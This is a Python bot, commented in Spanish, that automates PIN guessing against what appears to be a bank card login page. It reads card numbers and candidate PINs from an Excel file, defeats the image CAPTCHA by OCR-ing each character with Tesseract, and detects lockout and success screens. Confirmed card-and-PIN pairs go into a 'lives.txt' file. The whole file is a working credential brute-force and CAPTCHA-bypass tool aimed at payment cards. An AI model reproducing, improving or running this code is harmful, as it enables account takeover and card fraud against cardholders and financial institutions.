import os #Borrar consola
import pytesseract
from PIL import Image
from collections import Counter

import numpy as np

import pyautogui 
import time
import datetime
from openpyxl import load_workbook # excel

import cv2
#import telegram

pytesseract.pytesseract.tesseract_cmd = r"D:\Tesseract-OCR\tesseract.exe"
#text = pytesseract.image_to_string(Image.open("test5.png"),config='--psm 10 --oem 3 -c tessedit_char_whitelist=01234566789abcdefghijkmnlopqesturstuvwxyz')


#Datos ingresados es incorrecto Y limite superado:
Pos_NumeroTarje = 101,407
Pos_ClaveCajero = 170,546
Pos_CodigoImagen = 228,682
exe = 708,16

#lugar_clave = 349,552
#cancelar = 1502,994
#ok_error = 1641,614

def click (pos,click = 1):
    pyautogui.moveTo(pos)
    pyautogui.click(clicks=click)

def borrar(i):
    for i in range (1,i):
        pyautogui.press('backspace')

def Logeo():
    pyautogui.click(310,321)
    pyautogui.typewrite("4919148300000000")
    pyautogui.click(274,470)
    pyautogui.typewrite("1111")
    pyautogui.click(254,628)
    pyautogui.typewrite("asdasd")
    pyautogui.press("enter")
    time.sleep(2)

def BusquedaAbecedarioRegion(region=1):
    contador_emergencia = 1
    '''
    aa = None
    bb = None
    cc = None
    dd = None
    ee = None
    ff = None
    gg = None
    hh = None
    ii = None
    jj = None
    kk = None
    ll = None
    mm = None
    nn = None
    oo = None
    pp = None
    ''' # no creo que sea necesario por ser función

    #print("Comenzando")
    while(True):
        time.sleep(1)
        #print("Entrado")
        
        contador_emergencia = contador_emergencia+1
        if contador_emergencia%3==1:
            print("Algo salió mal")
            contador_emergencia = 2
            input()

        a = "./Abecedario/a.png"
        aa = pyautogui.locateOnScreen(a, grayscale=True, confidence=0.9, region=(region))
        if aa!=None:
            return "a"
            break

        a2 = "./Abecedario/a2.png"
        aa2 = pyautogui.locateOnScreen(a2, grayscale=True, confidence=0.9, region=(region))
        if aa2!=None:
            return "a"
            break

        b = "./Abecedario/b.png"
        bb = pyautogui.locateOnScreen(b, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        if bb!=None:
            return "b"
            break

        o = "./Abecedario/o.png"
        oo = pyautogui.locateOnScreen(o, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if oo!=None:
            #print("es d")
            #texto = texto + "b"
            return "o"
            break

        c = "./Abecedario/c.png"
        cc = pyautogui.locateOnScreen(c, grayscale=True, confidence=0.9, region=(region))
        if cc!=None:
            return "c"
            break

        c2 = "./Abecedario/c2.png"
        cc2 = pyautogui.locateOnScreen(c2, grayscale=True, confidence=0.9, region=(region))
        if cc2!=None:
            return "c"
            break

        d = "./Abecedario/d.png"
        dd = pyautogui.locateOnScreen(d, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if dd!=None:
            #print("es d")
            #texto = texto + "b"
            return "d"
            break

        e = "./Abecedario/e.png"
        ee = pyautogui.locateOnScreen(e, grayscale=True, confidence=0.9, region=(region))
        if ee!=None:
            return "e"
            break

        e2 = "./Abecedario/e2.png"
        ee2 = pyautogui.locateOnScreen(e2, grayscale=True, confidence=0.9, region=(region))
        if ee2!=None:
            return "e"
            break
        
        f = "./Abecedario/f.png"
        ff = pyautogui.locateOnScreen(f, grayscale=True, confidence=0.9, region=(region))
        if ff!=None:
            return "f"
            break
        f2 = "./Abecedario/f2.png"
        ff2 = pyautogui.locateOnScreen(f2, grayscale=True, confidence=0.9, region=(region))
        if ff2!=None:
            return "f"
            break

        g = "./Abecedario/g.png"
        gg = pyautogui.locateOnScreen(g, grayscale=True, confidence=0.9, region=(region))
       # print(".")
        #print("b",bb)
        if gg!=None:
            #print("es d")
            #texto = texto + "b"
            return "g"
            break

        g2 = "./Abecedario/g2.png"
        gg2 = pyautogui.locateOnScreen(g2, grayscale=True, confidence=0.9, region=(region))
        if gg2!=None:
            return "g"
            break


        h = "./Abecedario/h.png"
        hh = pyautogui.locateOnScreen(h, grayscale=True, confidence=0.9, region=(region))
        if hh!=None:
            return "h"
            break

        j = "./Abecedario/j.png"
        jj = pyautogui.locateOnScreen(j, grayscale=True, confidence=0.9, region=(region))
        if jj!=None:
            return "j"
            break

        j2 = "./Abecedario/j2.png"
        jj2 = pyautogui.locateOnScreen(j2, grayscale=True, confidence=0.9, region=(region))
        if jj2!=None:
            return "j"
            break

        i = "./Abecedario/i.png"
        ii = pyautogui.locateOnScreen(i, grayscale=True, confidence=0.9, region=(region))
        if ii!=None:
            return "i"
            breaki

        i2= "./Abecedario/i2.png"
        ii2 = pyautogui.locateOnScreen(i2, grayscale=True, confidence=0.9, region=(region))
        if ii2!=None:
            return "i"
            break

        i3= "./Abecedario/i3.png"
        ii3 = pyautogui.locateOnScreen(i3, grayscale=True, confidence=0.9, region=(region))
        if ii3!=None:
            return "i"
            break

        

        k = "./Abecedario/k.png"
        kk = pyautogui.locateOnScreen(k, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if kk!=None:
            #print("es d")
            #texto = texto + "b"
            return "k"
            break

       # L al final

        m = "./Abecedario/m.png"
        mm = pyautogui.locateOnScreen(m, grayscale=True, confidence=0.9, region=(region))
        if mm!=None:
            return "m"
            break

        #m2 = "./Abecedario/m2.png"
        #mm2 = pyautogui.locateOnScreen(m2, grayscale=True, confidence=0.9, region=(region))
        #if mm2!=None:
            #return "m"
           # break

        n = "./Abecedario/n.png" # Antes por problemas tecnicos 
        nn = pyautogui.locateOnScreen(n, grayscale=True, confidence=0.9, region=(region))
        if nn!=None:
            return "n"
            break

        n2 = "./Abecedario/n2.png" # Antes por problemas tecnicos 
        nn2 = pyautogui.locateOnScreen(n2, grayscale=True, confidence=0.9, region=(region))
        if nn2!=None:
            return "n"
            break

       

        p = "./Abecedario/p.png"
        pp = pyautogui.locateOnScreen(p, grayscale=True, confidence=0.9, region=(region))
        if pp!=None:
            return "p"
            break

        p2 = "./Abecedario/p2.png"
        pp2 = pyautogui.locateOnScreen(p2, grayscale=True, confidence=0.9, region=(region))
        if pp2!=None:
            return "p"
            break

        q = "./Abecedario/q.png"
        qq = pyautogui.locateOnScreen(q, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if qq!=None:
            #print("es d")
            #texto = texto + "b"
            return "q"
            break

        r = "./Abecedario/r.png"
        rr = pyautogui.locateOnScreen(r, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if rr!=None:
            #print("es d")
            #texto = texto + "b"
            return "r"
            break

        s = "./Abecedario/s.png"
        ss = pyautogui.locateOnScreen(s, grayscale=True, confidence=0.9, region=(region))
        if ss!=None:
            return "s"
            break
        s2 = "./Abecedario/s2.png"
        ss2 = pyautogui.locateOnScreen(s2, grayscale=True, confidence=0.9, region=(region))
        if ss2!=None:
            return "s"
            break

        t = "./Abecedario/t.png"
        tt = pyautogui.locateOnScreen(t, grayscale=True, confidence=0.9, region=(region))
       # print(".")
        #print("b",bb)
        if tt!=None:
            #print("es d")
            #texto = texto + "b"
            return "t"
            break

        u = "./Abecedario/u.png"
        uu = pyautogui.locateOnScreen(u, grayscale=True, confidence=0.9, region=(region))
        if uu!=None:
            return "u"
            break

        u2 = "./Abecedario/u2.png"
        uu2 = pyautogui.locateOnScreen(u2, grayscale=True, confidence=0.9, region=(region))
        if uu2!=None:
            return "u"
            break

        w = "./Abecedario/w.png"
        ww = pyautogui.locateOnScreen(w, grayscale=True, confidence=0.9, region=(region))
        if ww!=None:
            return "w"
            break

        w2 = "./Abecedario/w2.png"
        ww2 = pyautogui.locateOnScreen(w2, grayscale=True, confidence=0.9, region=(region))
        if ww2!=None:
            return "w"
            break

        x = "./Abecedario/x.png"
        xx = pyautogui.locateOnScreen(x, grayscale=True, confidence=0.9, region=(region))
        if xx!=None:
            return "x"
            breakx 

        x2 = "./Abecedario/x2.png"
        xx2 = pyautogui.locateOnScreen(x2, grayscale=True, confidence=0.9, region=(region))
        if xx2!=None:
            return "x"
            break

        y = "./Abecedario/y.png"
        yy = pyautogui.locateOnScreen(y, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if yy!=None:
            #print("es d")
            #texto = texto + "b"
            return "y"
            break

        v = "./Abecedario/v.png"
        vv = pyautogui.locateOnScreen(v, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if vv!=None:
            #print("es d")
            #texto = texto + "b"
            return "v"
            break

        z = "./Abecedario/z.png"
        zz = pyautogui.locateOnScreen(z, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if zz!=None:
            #print("es d")
            #texto = texto + "b"
            return "z"
            break

        uno = "./Abecedario/1.png"
        dunod = pyautogui.locateOnScreen(uno, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if dunod!=None:
            #print("es d")
            #texto = texto + "b"
            return "1"
            break

        dos = "./Abecedario/2.png"
        ddosd = pyautogui.locateOnScreen(dos, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if ddosd!=None:
            #print("es d")
            #texto = texto + "b"
            return "2"
            break

        tres = "./Abecedario/3.png"
        dtresd = pyautogui.locateOnScreen(tres, grayscale=True, confidence=0.9, region=(region))
       # print(".")
        #print("b",bb)
        if dtresd!=None:
            #print("es d")
            #texto = texto + "b"
            return "3"
            break

        cuatro = "./Abecedario/4.png"
        dcuatrod = pyautogui.locateOnScreen(cuatro, grayscale=True, confidence=0.9, region=(region))
       #print(".")
        #print("b",bb)
        if dcuatrod!=None:
            #print("es d")
            #texto = texto + "b"
            return "4"
            break

        cinco = "./Abecedario/5.png"
        dcincod = pyautogui.locateOnScreen(cinco, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if dcincod!=None:
            #print("es d")
            #texto = texto + "b"
            return "5"
            break

        seis = "./Abecedario/6.png"
        dseisd = pyautogui.locateOnScreen(seis, grayscale=True, confidence=0.9, region=(region))
       # print(".")
        #print("b",bb)
        if dseisd!=None:
            #print("es d")
            #texto = texto + "b"
            return "6"
            break

        siete = "./Abecedario/7.png"
        dsieted = pyautogui.locateOnScreen(siete, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if dsieted!=None:
            #print("es d")
            #texto = texto + "b"
            return "7"
            break

        ocho = "./Abecedario/8.png"
        dochod = pyautogui.locateOnScreen(ocho, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if dochod!=None:
            #print("es d")
            #texto = texto + "b"
            return "8"
            break

        nueve = "./Abecedario/9.png"
        dnueved = pyautogui.locateOnScreen(nueve, grayscale=True, confidence=0.9, region=(region))
        if dnueved!=None:
            return "9"
            break

        nueve2 = "./Abecedario/9(2).png"
        dnueved2 = pyautogui.locateOnScreen(nueve2, grayscale=True, confidence=0.9, region=(region))
        if dnueved2!=None:
            return "9"
            break

        cero = "./Abecedario/0.png"
        cero0 = pyautogui.locateOnScreen(cero, grayscale=True, confidence=0.9, region=(region))
        #print(".")
        #print("b",bb)
        if cero0!=None:
            #print("es d")
            #texto = texto + "b"
            return "0"
            break

        l = "./Abecedario/l.png"
        ll = pyautogui.locateOnScreen(l, grayscale=True, confidence=0.9, region=(region))
       # print(".")
        #print("b",bb)
        if ll!=None:
            #print("es d")
            #texto = texto + "b"
            return "l"
            break

        print("No encontrado...")
        #input()
        return "F"
        break

#Nombre del excel
filesheet = "./Felizanio22.xlsx"
wb = load_workbook(filesheet)
hojas = wb.get_sheet_names()
print(hojas)
nombres = wb.get_sheet_by_name('Hoja1')
wb.close()

os.system ("cls") 
CantidadInicial = input("Escriba desde que numero iniciará:  ")
CantidadInicial = (int(CantidadInicial))
CantidadFinal = input("Escriba desde que numero finalizará:  ")
CantidadFinal = (int(CantidadFinal))

#archivo.write("Dnis \n")


print("\n")
preg = input("¿Logeo?")


print("***************")
print("Presione 'Enter' para continuar")
input()

print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
print()

if preg == "si":
    Logeo()
    time.sleep(2)


for i in range(CantidadInicial,CantidadFinal):
    tarjeta, fecha1, fecha2,fecha3,fecha4,fecha5 = nombres[f'A{i}:F{i}'][0]
    # fecha 5 1234
    print("N°.", i)

    #Comenzando con la tarjeta
    click(Pos_NumeroTarje,click=2)
    borrar(2)
    time.sleep(0.3)
    click(Pos_NumeroTarje)
    
    print(tarjeta.value)
    pyautogui.typewrite(tarjeta.value)

    #Futuro While-----------------------------------------
    j = 0
    #for j in range(j,4):
    while j < 5:
        j = j + 1
        #time.sleep(0.1)
        #print("borrado")

        click(Pos_ClaveCajero)
        borrar(5)
        click(Pos_ClaveCajero)

        if fecha1.value=="-":
            print("No tiene clave")
            break;
        
        print("-----------------------------------------------------------------")
        if j == 1:
            print(fecha1.value)
            clave= fecha1.value
            pyautogui.typewrite(fecha1.value)
        if j == 2:
            print(fecha2.value)
            pyautogui.typewrite(fecha2.value)
            clave= fecha2.value
        if j == 3:
            print(fecha3.value)
            clave= fecha3.value
            pyautogui.typewrite(fecha3.value)
            
        if j == 4:
            print(fecha4.value)
            clave= fecha4.value
            pyautogui.typewrite(fecha4.value)

        if j == 5:
            print(fecha5.value)
            clave= fecha5.value
            pyautogui.typewrite(fecha5.value)
            
        


        click(Pos_CodigoImagen)
        borrar(7)


        #pyautogui.screenshot('captcha.jpg' , region=(181,560,171,76))

        time.sleep(0.2)

        #text = pytesseract.image_to_string(Image.open("captcha.jpg"), lang='eng',config='--psm 6 --oem 3 -c tessedit_char_whitelist=01234566789abcdefghijkmnlopqesturstuvwxyz')
        #text = pytesseract.image_to_string(Image.open("captcha.jpg"),config="-c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz --psm 6")
        #text = pytesseract.image_to_string(Image.open("captcha.jpg"), lang='eng', boxes=False,config='--psm 10 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz')
        #time.sleep(0.2)

        
        pyautogui.screenshot('CaptchaActual.png' , region=(180,569,173,75))

        pyautogui.screenshot('A1.png' , region=(186,584,33,75))
        pyautogui.screenshot('A2.png' , region=(215,584,28,75))
        pyautogui.screenshot('A3.png' , region=(240,584,23,75))
        pyautogui.screenshot('A4.png' , region=(261,584,28,75)) #max iquierda
        pyautogui.screenshot('A5.png' , region=(287,584,27,75))
        pyautogui.screenshot('A6.png' , region=(312,584,28,75))

       # print("Wuju")
        #Primera letra:

        texto = ""
        print("------------------")
        p1 = pytesseract.image_to_string(Image.open("A1.png"), config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        if p1=="":
            p1 = pytesseract.image_to_string(Image.open("A1.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        texto = texto + p1.rstrip() + "|"
        #print(texto)
        p2 = pytesseract.image_to_string(Image.open("A2.png"), config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        if p2=="":
            p2 = pytesseract.image_to_string(Image.open("A2.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        texto = texto + p2.rstrip() + "|"
        #print(texto)
        p3 = pytesseract.image_to_string(Image.open("A3.png"), config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        if p3=="":
            p3 = pytesseract.image_to_string(Image.open("A3.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        texto = texto + p3.rstrip() + "|"
        #print(texto)
        p4 = pytesseract.image_to_string(Image.open("A4.png"), config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        if p4=="":
            p4 = pytesseract.image_to_string(Image.open("A4.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        texto = texto + p4.rstrip() + "|"
        #print(texto)
        p5 = pytesseract.image_to_string(Image.open("A5.png"), config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        #p5.rstrip()
        if p5.rstrip()=="1":
            #print("pa")
            p5 = pytesseract.image_to_string(Image.open("A5.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        if p5=="":
            p5 = pytesseract.image_to_string(Image.open("A5.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        texto = texto + p5.rstrip() + "|"
        #print(texto)
        p6 = pytesseract.image_to_string(Image.open("A6.png"), config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        if p6=="":
            p6 = pytesseract.image_to_string(Image.open("A6.png"), config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        texto = texto + p6.rstrip() + "|"

        # .rstrip() para eliminar el salto de linea :D
        texto = texto.replace(" ","")


        print("-------------------------")
        print("Texto: "+ texto)
        print("-------------------------")
        texto = texto.replace("|","")
        texto = texto + "ii"

        #texto = p1+p2+p3+p4+p5+p6

        #print("terminó bucle")
        #click(exe)
        #input()

        click (Pos_CodigoImagen)
        pyautogui.typewrite(texto)
        time.sleep(0.2)

        #click(exe)
        #input()

        pyautogui.press('enter')

        time.sleep(2.8)

        '''
        r = None
        invalido = "error.png"
        time.sleep(1.5)
        r = pyautogui.locateOnScreen(invalido, grayscale=True, confidence=0.9, region=(440,593,85,152))
        #print("r",r)
        if r!=None:
            print("retrocediendo")
            j = j-1 
        '''

        rojo =  False
        #try:
        #Color: 464,685(252,223,223)
        rojo = pyautogui.pixelMatchesColor(464,685,(252,223,223))
        time.sleep(0.1)
        print("\n")
        if (rojo is True):
            print("retrocediendo")
            j = j-1 
        if(rojo is False):
            print("Acertado! next")


        #print("...")

        time.sleep(1)
        
        verificar = None 
        limite = "./Imagenes/LimiteSuperado.png"
        verificar = pyautogui.locateOnScreen(limite, grayscale=True, confidence=0.9, region=(9,199,552,123))
        if verificar!=None:
            print("----------------")
            print("limite Superado")
            print("----------------")
            break

        verificar2 = None 
        Live = "./Imagenes/Live.png"
        verificar2 = pyautogui.locateOnScreen(Live, grayscale=True, confidence=0.9, region=(0,0,562,750))
        if verificar2!=None:
            print("----------------")
            print ('\a')
            print("Clave Encontrada!")
            print("----------------")
           # print("N°.", i)
            lives = open("lives.txt","a")
            lives.write(str(i)) # escribir en el block
            lives.write("\n")
            lives.write(tarjeta.value.rstrip()) # escribir en el block
            lives.write("\n")
            lives.write(str(clave))
            lives.write("\n")
            lives.write("------------------------------------")
            lives.write("\n")
            lives.close()

            pyautogui.press('esc')
            time.sleep(3)
            pyautogui.click(284,439)
            time.sleep(17)
            Logeo()
            break

        

    os.system ("cls") 
    print("Next")




    







